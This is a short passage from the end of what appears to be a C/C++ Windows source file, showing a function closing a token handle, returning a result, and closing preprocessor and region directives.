		CloseHandle(hToken);
	}
	return fRet;
}

#endif
#pragma endregion

